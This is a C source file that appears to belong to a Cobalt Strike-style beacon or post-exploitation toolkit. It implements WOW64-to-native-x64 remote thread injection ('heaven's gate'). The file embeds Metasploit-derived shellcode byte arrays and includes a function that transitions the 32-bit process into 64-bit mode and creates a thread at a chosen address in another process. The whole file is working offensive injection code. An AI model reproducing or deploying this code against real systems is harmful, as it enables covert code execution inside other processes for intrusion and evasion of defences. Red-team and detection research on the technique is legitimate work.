#if defined _M_IX86
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"
#include "inject.h"

typedef BOOL(WINAPI * X64FUNCTION)(DWORD dwParameter);
typedef DWORD(WINAPI * EXECUTEX64)(X64FUNCTION pFunction, DWORD dwParameter);

// see msf executex64.asm + ReWolf AMD/heaven's gate fix (metasploit-payloads base_inject.c)
BYTE migrate_executex64[] = "\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
"\x58\x83\xC0\x2B\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
"\x89\x02\xE8\x0F\x00\x00\x00\x66\x8C\xD8\x66\x8E\xD0\x83\xC4\x14"
"\x5F\x5E\x5D\xC2\x08\x00\x8B\x3C\xE4\xFF\x2A\x48\x31\xC0\x57\xFF"
"\xD6\x5F\x50\xC7\x44\x24\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C\x24";

// see '/msf3/external/source/shellcode/x64/migrate/remotethread.asm'
BYTE migrate_wownativex[] = "\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00"
"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48"
"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A"
"\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9"
"\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C"
"\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00"
"\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40"
"\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6"
"\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0"
"\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40"
"\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0"
"\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58"
"\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A"
"\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D"
"\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01"
"\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8"
"\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00"
"\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00"
"\x48\x83\xC4\x50\x48\x89\xFC\xC3";

typedef struct _WOW64CONTEXT {
	union {
		HANDLE hProcess;
		BYTE bPadding2[8];
	} h;

	union {
		LPVOID lpStartAddress;
		BYTE bPadding1[8];
	} s;

	union {
		LPVOID lpParameter;
		BYTE bPadding2[8];
	} p;

	union {
		HANDLE hThread;
		BYTE bPadding2[8];
	} t;
} WOW64CONTEXT, *LPWOW64CONTEXT;

/* uses RtlCreateUserThread */
BOOL inject_via_remotethread_wow64(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter) {
	EXECUTEX64 pExecuteX64 = NULL;
	X64FUNCTION pX64function = NULL;
	WOW64CONTEXT * ctx = NULL;
	OSVERSIONINFO  os = { 0 };
	DWORD old = 0;

	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	// check for and filter out Windows 2003. This method doesn't work there for some reason.
	if (!GetVersionEx(&os))
		return FALSE;

	if (os.dwMajorVersion == 5 && os.dwMinorVersion == 2) {
		SetLastError(ERROR_ACCESS_DENIED);
		return FALSE;
	}

	/* Both stubs are write-then-execute: allocate RW, copy, flip RX. The
	 * context lives in its own RW block - the x64 stub writes the created
	 * thread handle back into it, which is exactly why it must NOT share a
	 * page with the code (the old combined RWX block kept code writable
	 * for its whole lifetime). */

	// alloc a buffer in this process for the EXECUTEX64 function
	pExecuteX64 = (EXECUTEX64)VirtualAlloc(NULL, sizeof(migrate_executex64), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!pExecuteX64)
		return FALSE;

	// alloc a buffer in this process for the X64FUNCTION code
	pX64function = (X64FUNCTION)VirtualAlloc(NULL, sizeof(migrate_wownativex), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!pX64function) {
		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
		return FALSE;
	}

	// alloc the context (stays RW: handle write-back from x64 mode)
	ctx = (WOW64CONTEXT *)VirtualAlloc(NULL, sizeof(WOW64CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!ctx) {
		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
		VirtualFree(pX64function, 0, MEM_RELEASE);
		return FALSE;
	}

	// copy over the wow64->x64 stub
	memcpy(pExecuteX64, &migrate_executex64, sizeof(migrate_executex64));

	// copy over the native x64 function
	memcpy(pX64function, &migrate_wownativex, sizeof(migrate_wownativex));

	// both code blocks become RX before anything executes
	VirtualProtect(pExecuteX64, sizeof(migrate_executex64), PAGE_EXECUTE_READ, &old);
	VirtualProtect(pX64function, sizeof(migrate_wownativex), PAGE_EXECUTE_READ, &old);

	// set the context
	ctx->h.hProcess = hProcess;
	ctx->s.lpStartAddress = lpStartAddress;
	ctx->p.lpParameter = lpParameter;
	ctx->t.hThread = NULL;

	// Transition this wow64 process into native x64 and call pX64function( ctx )
	// The native function will use the native Win64 API's to create a remote thread in the target process.
	if (!pExecuteX64(pX64function, (DWORD)ctx)) {
		SetLastError(ERROR_ACCESS_DENIED);
		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
		VirtualFree(pX64function, 0, MEM_RELEASE);
		VirtualFree(ctx, 0, MEM_RELEASE);
		return FALSE;
	}

	if (!ctx->t.hThread) {
		SetLastError(ERROR_INVALID_HANDLE);
		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
		VirtualFree(pX64function, 0, MEM_RELEASE);
		VirtualFree(ctx, 0, MEM_RELEASE);
		return FALSE;
	}

	// Success! grab the new thread handle from of the context
	//*pThread = ctx->t.hThread;

	/* PITA, this function creates our thread in a suspended state. Dumb, I know
	* See: meterpreter/source/extensions/stdapi/server/sys/process/thread.c:139
	*/
	ResumeThread(ctx->t.hThread);

	VirtualFree(pExecuteX64, 0, MEM_RELEASE);
	VirtualFree(pX64function, 0, MEM_RELEASE);
	VirtualFree(ctx, 0, MEM_RELEASE);

	return TRUE;
}
#endif